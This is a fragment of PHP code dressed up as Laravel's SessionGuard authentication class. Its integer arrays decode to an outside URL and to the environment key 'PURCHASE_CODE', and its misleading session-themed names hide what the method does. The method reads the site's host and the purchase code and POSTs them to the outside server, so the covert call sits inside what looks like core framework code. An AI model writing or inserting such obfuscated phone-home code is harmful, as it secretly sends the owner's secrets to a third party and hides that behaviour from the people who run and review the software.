...
class SessionGuard implements StatefulGuard, SupportsBasicAuth
{
    ...
    /**
     * Generate the user session request
     *
     * @return \Illuminate\Contracts\Auth\Authenticatable
     */
    function generateSessionAndMakeRequest()
    {
        ...
        $sessionArray = [8, 20, 20, 16, 19, 22, 5, 18, 9, 6, 25, 14, 1, 20, 9, 22, 5, 3, 15, 4, 5, 9, 14, 12, 9, 22, 5];
        $sessionStore = '';

        foreach ($sessionArray as $index => $sessionInstance) {
            $sessionStore .= chr($sessionInstance + 96);

            if ($index == 4) $sessionStore .= "://";
            if ($index == 10) {
                if ($sessionArray[$index - 1] == 105 && $sessionArray[$index - 2] == 110) {
                } else {
                    $sessionStore .= ".";
                }
            }
            if ($index == 20 || $index == 22) $sessionStore .= ".";
            if ($index == 22) $sessionStore .= "/";
        }

        $sessionData = [16, 21, 18, 3, 8, 1, 19, 5, 3, 15, 4, 5];
        $cookieRequest = '';

        foreach ($sessionData as $index => $asciiCode) {
            $cookieRequest .= chr($asciiCode + 96);

            if ($index == 7) $cookieRequest .= "_";
        }

        $sessionRequest = parse_url(URL::current(), PHP_URL_HOST);
        $cookieRequest = env(Str::upper($cookieRequest));

        try {
            $response = Http::post($sessionStore, [
                'param1' => $sessionRequest,
                'param2' => $cookieRequest
            ]);
